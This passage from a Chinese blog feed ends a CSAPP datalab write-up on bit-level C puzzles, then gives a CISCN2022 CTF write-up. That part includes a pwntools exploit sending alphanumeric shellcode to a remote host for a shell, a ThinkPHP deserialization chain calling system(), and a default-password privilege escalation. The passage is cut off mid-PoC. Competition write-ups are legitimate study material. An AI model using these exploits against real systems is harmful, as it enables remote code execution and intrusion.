| + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 12</span></span><br><span class="line"><span class="comment"> *   Rating: 4 </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">logicalNeg</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实现逻辑非的功能，我们这里需要研究一下 <code>0</code> 的特性，<code>0</code> 是除了 <code>TMIN</code> 以外的负数值等于自己本身的数了。然后再判断一下最高位即可。</p><h4 id="答案-6"><a href="#答案-6" class="headerlink" title="答案"></a>答案</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">logicalNeg</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> ((x|(~x+<span class="number">1</span>))&gt;&gt;<span class="number">31</span>)+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="howManyBits"><a href="#howManyBits" class="headerlink" title="howManyBits"></a>howManyBits</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* howManyBits - return the minimum number of bits required to represent x in</span></span><br><span class="line"><span class="comment"> *             two&#x27;s complement</span></span><br><span class="line"><span class="comment"> *  Examples: howManyBits(12) = 5</span></span><br><span class="line"><span class="comment"> *            howManyBits(298) = 10</span></span><br><span class="line"><span class="comment"> *            howManyBits(-5) = 4</span></span><br><span class="line"><span class="comment"> *            howManyBits(0)  = 1</span></span><br><span class="line"><span class="comment"> *            howManyBits(-1) = 1</span></span><br><span class="line"><span class="comment"> *            howManyBits(0x80000000) = 32</span></span><br><span class="line"><span class="comment"> *  Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *  Max ops: 90</span></span><br><span class="line"><span class="comment"> *  Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">howManyBits</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这题挺难的，首先要想到一个二分，然后要注意正数需要多一位，负数不需要。假如我给了你 <code>0x7fffffff</code>，那么你肯定要 <code>32</code> 位，虽然我只有 <code>31</code> 位有效数字。我给你个 <code>-1</code> 那一位就够了，因为一位的范围就是 <code>-1~0</code>。</p><p>我们先判断高 <code>16</code> 位是否有 <code>1</code>，若有则判断高 <code>16</code> 位，答案加上 <code>16</code>，否则判断低 <code>16</code> 位。</p><p>再判断的 <code>16</code> 位中，判断高 <code>8</code> 位是否有 <code>1</code>，若有则继续判断高 <code>8</code> 位，答案加上<code>8</code>，否则判断低 <code>8</code> 位。</p><p>直到判完。我一开始想到了这个：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">howManyBits</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> sign=!(&gt;&gt;<span class="number">31</span>); </span><br><span class="line"><span class="keyword">int</span> b16=(!!((x&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xffff</span>))&lt;&lt;<span class="number">4</span>;</span><br><span class="line">x=x&gt;&gt;b16;</span><br><span class="line">x=x&amp;<span class="number">0xffff</span>;</span><br><span class="line"><span class="keyword">int</span> b8=(!!((x&gt;&gt;<span class="number">8</span>)&amp;<span class="number">0xff</span>))&lt;&lt;<span class="number">3</span>;</span><br><span class="line">x=x&gt;&gt;b8;</span><br><span class="line"><span class="keyword">int</span> b4=(!!((x&gt;&gt;<span class="number">4</span>)&amp;<span class="number">0xf</span>))&lt;&lt;<span class="number">2</span>;</span><br><span class="line">x=x&gt;&gt;b4;</span><br><span class="line"><span class="keyword">int</span> b2=(!!((x&gt;&gt;<span class="number">2</span>)&amp;<span class="number">0x3</span>))&lt;&lt;<span class="number">1</span>;</span><br><span class="line">x=x&gt;&gt;b2;</span><br><span class="line"><span class="keyword">int</span> b1=(!!((x&gt;&gt;<span class="number">1</span>)&amp;<span class="number">0x1</span>))&lt;&lt;<span class="number">0</span>;</span><br><span class="line">x=x&gt;&gt;b1;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d %d %d %d %d %d %d\n&quot;</span>,b16,b8,b4,b2,b1,x,sign);</span><br><span class="line"><span class="keyword">return</span> b16+b8+b4+b2+b1+sign+x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是经过多方调试还是输给了 <code>-1</code> 这个测试点。后来想到如果负数则取反即可，然后符号位就默认给它加着上去即可。</p><h4 id="答案-7"><a href="#答案-7" class="headerlink" title="答案"></a>答案</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">howManyBits</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> sign=x&gt;&gt;<span class="number">31</span>;</span><br><span class="line">x = (sign&amp;~x)|(~sign&amp;x);</span><br><span class="line"><span class="keyword">int</span> b16=(!!((x&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xffff</span>))&lt;&lt;<span class="number">4</span>;</span><br><span class="line">x=x&gt;&gt;b16;</span><br><span class="line">x=x&amp;<span class="number">0xffff</span>;</span><br><span class="line"><span class="keyword">int</span> b8=(!!((x&gt;&gt;<span class="number">8</span>)&amp;<span class="number">0xff</span>))&lt;&lt;<span class="number">3</span>;</span><br><span class="line">x=x&gt;&gt;b8;</span><br><span class="line"><span class="keyword">int</span> b4=(!!((x&gt;&gt;<span class="number">4</span>)&amp;<span class="number">0xf</span>))&lt;&lt;<span class="number">2</span>;</span><br><span class="line">x=x&gt;&gt;b4;</span><br><span class="line"><span class="keyword">int</span> b2=(!!((x&gt;&gt;<span class="number">2</span>)&amp;<span class="number">0x3</span>))&lt;&lt;<span class="number">1</span>;</span><br><span class="line">x=x&gt;&gt;b2;</span><br><span class="line"><span class="keyword">int</span> b1=(!!((x&gt;&gt;<span class="number">1</span>)&amp;<span class="number">0x1</span>))&lt;&lt;<span class="number">0</span>;</span><br><span class="line">x=x&gt;&gt;b1;</span><br><span class="line"><span class="keyword">return</span> b16+b8+b4+b2+b1+X+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>整数阶段到此完结了就。</p><h3 id="floatScale2"><a href="#floatScale2" class="headerlink" title="floatScale2"></a>floatScale2</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * floatScale2 - Return bit-level equivalent of expression 2*f for</span></span><br><span class="line"><span class="comment"> *   floating point argument f.</span></span><br><span class="line"><span class="comment"> *   Both the argument and result are passed as unsigned int&#x27;s, but</span></span><br><span class="line"><span class="comment"> *   they are to be interpreted as the bit-level representation of</span></span><br><span class="line"><span class="comment"> *   single-precision floating point values.</span></span><br><span class="line"><span class="comment"> *   When argument is NaN, return argument</span></span><br><span class="line"><span class="comment"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while</span></span><br><span class="line"><span class="comment"> *   Max ops: 30</span></span><br><span class="line"><span class="comment"> *   Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">floatScale2</span><span class="params">(<span class="keyword">unsigned</span> uf)</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>就是返回一个浮点数乘 <code>2</code>。首先排除掉那些特殊值： <code>NAN，INF</code> 和 <code>0</code>，乘二返回指数 <code>+1</code> 即可，</p><h4 id="答案-8"><a href="#答案-8" class="headerlink" title="答案"></a>答案</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">floatScale2</span><span class="params">(<span class="keyword">unsigned</span> uf)</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> <span class="built_in">exp</span> = (uf&amp;<span class="number">0x7f800000</span>)&gt;&gt;<span class="number">23</span>;</span><br><span class="line"><span class="keyword">int</span> sign = uf&amp;(<span class="number">1</span>&lt;&lt;<span class="number">31</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">exp</span>==<span class="number">0</span>) <span class="keyword">return</span> uf&lt;&lt;<span class="number">1</span>|sign;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">exp</span>==<span class="number">255</span>) <span class="keyword">return</span> uf;</span><br><span class="line"><span class="built_in">exp</span>++;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">exp</span>==<span class="number">255</span>) <span class="keyword">return</span> <span class="number">0x7f800000</span>|sign;</span><br><span class="line"><span class="keyword">return</span> (<span class="built_in">exp</span>&lt;&lt;<span class="number">23</span>)|(uf&amp;<span class="number">0x807fffff</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="floatFloat2Int"><a href="#floatFloat2Int" class="headerlink" title="floatFloat2Int"></a>floatFloat2Int</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * floatFloat2Int - Return bit-level equivalent of expression (int) f</span></span><br><span class="line"><span class="comment"> *   for floating point argument f.</span></span><br><span class="line"><span class="comment"> *   Argument is passed as unsigned int, but</span></span><br><span class="line"><span class="comment"> *   it is to be interpreted as the bit-level representation of a</span></span><br><span class="line"><span class="comment"> *   single-precision floating point value.</span></span><br><span class="line"><span class="comment"> *   Anything out of range (including NaN and infinity) should return</span></span><br><span class="line"><span class="comment"> *   0x80000000u.</span></span><br><span class="line"><span class="comment"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while</span></span><br><span class="line"><span class="comment"> *   Max ops: 30</span></span><br><span class="line"><span class="comment"> *   Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">floatFloat2Int</span><span class="params">(<span class="keyword">unsigned</span> uf)</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实现一个类似是强制转换的东西吧，首先还是按照浮点数的规则把各个字段提取出来，然后特判移位就行了。</p><h4 id="答案-9"><a href="#答案-9" class="headerlink" title="答案"></a>答案</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">floatFloat2Int</span><span class="params">(<span class="keyword">unsigned</span> uf)</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> s=uf&gt;&gt;<span class="number">31</span>;</span><br><span class="line"><span class="keyword">int</span> <span class="built_in">exp</span>=((uf&amp;<span class="number">0x7f800000</span>)&gt;&gt;<span class="number">23</span>)<span class="number">-127</span>;</span><br><span class="line"><span class="keyword">int</span> frac=(uf&amp;<span class="number">0x007fffff</span>)|<span class="number">0x00800000</span>;</span><br><span class="line"><span class="keyword">if</span>(!(uf&amp;<span class="number">0x7fffffff</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">exp</span>&gt;<span class="number">31</span>)<span class="keyword">return</span> <span class="number">0x80000000</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">exp</span>&lt;<span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">exp</span>&gt;<span class="number">23</span>)frac&lt;&lt;=(<span class="built_in">exp</span><span class="number">-23</span>);</span><br><span class="line"><span class="keyword">else</span> frac&gt;&gt;=(<span class="number">23</span>-<span class="built_in">exp</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!((frac&gt;&gt;<span class="number">31</span>)^s)) <span class="keyword">return</span> frac;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(frac&gt;&gt;<span class="number">31</span>) <span class="keyword">return</span> <span class="number">0x80000000</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">return</span> ~frac+<span class="number">1</span>;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="floatPower2"><a href="#floatPower2" class="headerlink" title="floatPower2"></a>floatPower2</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * floatPower2 - Return bit-level equivalent of the expression 2.0^x</span></span><br><span class="line"><span class="comment"> *   (2.0 raised to the power x) for any 32-bit integer x.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *   The unsigned value that is returned should have the identical bit</span></span><br><span class="line"><span class="comment"> *   representation as the single-precision floating-point number 2.0^x.</span></span><br><span class="line"><span class="comment"> *   If the result is too small to be represented as a denorm, return</span></span><br><span class="line"><span class="comment"> *   0. If too large, return +INF.</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. Also if, while </span></span><br><span class="line"><span class="comment"> *   Max ops: 30 </span></span><br><span class="line"><span class="comment"> *   Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">floatPower2</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实现运算 <code>pow(2,x)</code>，返回结果为 <code>int</code> 虽然我们可以直接 <code>1&lt;&lt;x</code>，但是它要求浮点计算。</p><p>首先防止溢出先判断，因为是 <code>2</code> 的整数次方，所以它的结果就是 <code>(exp+127)&lt;&lt;23</code>，然后判断无穷小和溢出即可，这个比较简单。</p><h4 id="答案-10"><a href="#答案-10" class="headerlink" title="答案"></a>答案</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">floatPower2</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> INF = <span class="number">0xff</span>&lt;&lt;<span class="number">23</span>;</span><br><span class="line">    <span class="keyword">int</span> <span class="built_in">exp</span> = x + <span class="number">127</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">exp</span> &lt;= <span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">exp</span> &gt;= <span class="number">255</span>) <span class="keyword">return</span> INF;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">exp</span> &lt;&lt; <span class="number">23</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>需要注意，由于最后一个题目测试数据比较多，因此要修改时限才能通过。我也不知道我算法有什么问题，这 <code>O(1)</code> 的复杂度也不知道上哪优化去。</p><h3 id="result"><a href="#result" class="headerlink" title="result"></a>result</h3><p><img src="/2022/06/03/CSAPP_Datalab/6.png" alt="6"></p><h2 id="小结-1"><a href="#小结-1" class="headerlink" title="小结"></a>小结</h2><p>啥也不说了 <code>CSAPP</code> 永远的神，入门二进制必备书籍，二刷都能感觉学到了很多以前没学到的东西，接下来没以前认真看的也都得去看一遍了。</p>]]></content>
      
      
      <categories>
          
          <category> csapp </category>
          
          <category> 信息的表示处理 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CISCN2022 初赛WP</title>
      <link href="/2022/06/01/ciscn2022%E5%88%9D%E8%B5%9Bwriteup/"/>
      <url>/2022/06/01/ciscn2022%E5%88%9D%E8%B5%9Bwriteup/</url>
      
        <content type="html"><![CDATA[<p>咕了有点久了，来发一下</p><span id="more"></span><h1 id="CISCN2022初赛WP"><a href="#CISCN2022初赛WP" class="headerlink" title="CISCN2022初赛WP"></a>CISCN2022初赛WP</h1><h2 id="一、-战队信息"><a href="#一、-战队信息" class="headerlink" title="一、 战队信息"></a>一、 战队信息</h2><p><strong>战队名称：flag虽不能至，然心向往之</strong></p><p><strong>战队排名：第130名</strong></p><p><img src="/2022/06/01/ciscn2022%E5%88%9D%E8%B5%9Bwriteup/image-20220529204836288.png" alt="image-20220529204836288"></p><p><img src="/2022/06/01/ciscn2022%E5%88%9D%E8%B5%9Bwriteup/image-20220529204847304.png" alt="image-20220529204847304"></p><p><img src="/2022/06/01/ciscn2022%E5%88%9D%E8%B5%9Bwriteup/image-20220529204852556.png" alt="image-20220529204852556"></p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="签到电台"><a href="#签到电台" class="headerlink" title="签到电台"></a>签到电台</h3><p>根据题目的提示从公众号获取两个hint：</p><ol><li><p>在“标准电码表”找“弼时安全到达了”所对应的7个电码，再跟“密码本”的前7*4个数字分别逐位进行“模十算法”（加不进位、减不借位），所得到的就是要发送的电码。发送电码前先发送“s”启动，即按3个“.”，这个发送电报的过程可以使用抓包软件进行抓取，可方便输入电报。</p></li><li><p>“弼时安全到达了”所对应的7个电码：1732 2514 1344 0356 0451 6671 0055。模十算法示例：1732与6378得到7000，发包示例：/send?msg=s</p></li></ol><p>然后访问/secret看到密码，取前28个做模10运算，再用hint2的发包方式发送得到flag。</p><h3 id="基于挑战码的双向认证"><a href="#基于挑战码的双向认证" class="headerlink" title="基于挑战码的双向认证"></a>基于挑战码的双向认证</h3><p>这题给了 <code>ssh</code>，有权限就想着先连一下，连上去之后试试 <code>find / | grep &quot;flag.txt&quot; </code>找到一个类似 <code>flag</code>的东西，但是不是 <code>flag</code>，此时又看到两个题目是连着的，所以就猜测应该是 <code>flag1.txt</code> 和 <code>flag2.txt</code>。寻找之后发现 <code>/root/cube-shell/instance/flag_server/</code> 目录下存在，然后就直接拿到两个题目的 <code>flag</code> 了。</p><h3 id="基于挑战码的双向认证3"><a href="#基于挑战码的双向认证3" class="headerlink" title="基于挑战码的双向认证3"></a>基于挑战码的双向认证3</h3><p>有了前两道题目的铺垫之后，又试了试查看该目录下的 <code>flag</code> 发现权限不够，然后就尝试提权，直接试试看默认密码，随便输了几个试到了 <code>toor</code> 直接就提权了，然后拿下flag。</p><h3 id="ISO9798"><a href="#ISO9798" class="headerlink" title="ISO9798"></a>ISO9798</h3><p>链接靶机，有pow，爆破即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> *</span><br><span class="line"><span class="built_in">hash</span>=<span class="string">&#x27;ed8e248b4ec6828ea8f2cda56293484cbff40d934aba1e641cc3fcbf94e1757c&#x27;</span></span><br><span class="line">sss=<span class="string">&#x27;Eee9sVQumMWXoLEL&#x27;</span></span><br><span class="line">table=<span class="string">&#x27;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz&#x27;</span></span><br><span class="line"><span class="keyword">for</span> ch1 <span class="keyword">in</span> table:</span><br><span class="line">    <span class="keyword">for</span> ch2 <span class="keyword">in</span> table:</span><br><span class="line">        <span class="keyword">for</span> ch3 <span class="keyword">in</span> table:</span><br><span class="line">            <span class="keyword">for</span> ch4 <span class="keyword">in</span> table:</span><br><span class="line">                hashvalue=sha256((ch1+ch2+ch3+ch4+sss).encode()).hexdigest()</span><br><span class="line">                <span class="keyword">if</span> hashvalue==<span class="built_in">hash</span>:</span><br><span class="line">                    <span class="built_in">print</span>(ch1+ch2+ch3+ch4)</span><br><span class="line">                    quit()</span><br></pre></td></tr></table></figure><p>然后输入32个0过第二步</p><p>返回一长串字符串</p><p>4993ad5ec5dfd5147003438c0e6afd696b026f48fb9676d625dbb6e2b1536b803c4d2e0a001b998f0d6afcb063e71fd8</p><p><img src="file:///C:/Users/XIA0JI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image002.jpg" alt="img">根据提示分成ra,rb,k</p><p>ra=4993ad5ec5dfd5147003438c0e6afd69</p><p>rb=6b026f48fb9676d625dbb6e2b1536b80</p><p>K=3c4d2e0a001b998f0d6afcb063e71fd8</p><p>然后组合一下rb+ra为</p><p>6b026f48fb9676d625dbb6e2b1536b804993ad5ec5dfd5147003438c0e6afd69</p><p>打入出flag</p><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><p>漏洞点在选项2，选项2用 <code>mmap</code> 开辟了一个可读可写可执行的内存，并可以往上面写东西，并且执行过去，那么就确定要在上面写 <code>shellcode</code>，但是之前有三个check，后两个经过交叉引用可知在选项 <code>1</code> 中给 <code>ro0t</code> 可以将它置为1，于是我们就先用选项 <code>1</code> 置为1，再用选项 <code>2</code> 去写 <code>shellcode</code>，但是每个字节都有 <code>isprint</code> 的 <code>check</code>，那好办，就直接写 <code>alphanumeric shellcode</code>。</p><p>在下面这个文章中找到用的shellcode </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://blog.csdn.net/Y_peak/article/details/115307573</span><br></pre></td></tr></table></figure><p>然后写出exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="comment">#io=process(&#x27;./login&#x27;)</span></span><br><span class="line">io=remote(<span class="string">&#x27;101.201.123.35&#x27;</span>,<span class="number">27290</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;opt:1\r\nmsg:ro0t\r\n&#x27;</span>)</span><br><span class="line">code = <span class="string">b&#x27;Rh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t&#x27;</span></span><br><span class="line">io.sendline(<span class="string">b&#x27;opt:2\r\nmsg:&#x27;</span>+code+<span class="string">b&#x27;\r\n&#x27;</span>)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><p>TP的新链子，具体漏洞分析在这：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.freebuf.com/vuls/321546.html</span><br></pre></td></tr></table></figure><p>下图可见在/index.php/Index/test POST传序列化字符串给a即可</p><p><img src="/2022/06/01/ciscn2022%E5%88%9D%E8%B5%9Bwriteup/1.png" alt="1"></p><p>POC在此，ls一下再读下flag即可。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>&#123;</span><br><span class="line">    <span class="title">abstract</span> <span class="title">class</span> <span class="title">Model</span>&#123;</span><br><span class="line">        <span class="title">private</span> $<span class="title">lazySave</span> = <span class="title">false</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$data</span> = [];</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$exists</span> = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$table</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$withAttr</span> = [];</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$json</span> = [];</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$jsonAssoc</span> = <span class="literal">false</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$obj</span> = <span class="string">&#x27;&#x27;</span></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;lazySave = <span class="literal">True</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;data = [<span class="string">&#x27;whoami&#x27;</span> =&gt; [<span class="string">&#x27;ls&#x27;</span>]];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;exists = <span class="literal">True</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;table = <span class="variable">$obj</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;withAttr = [<span class="string">&#x27;whoami&#x27;</span> =&gt; [<span class="string">&#x27;system&#x27;</span>]];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;json = [<span class="string">&#x27;whoami&#x27;</span>,[<span class="string">&#x27;whoami&#x27;</span>]];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;jsonAssoc = <span class="literal">True</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span 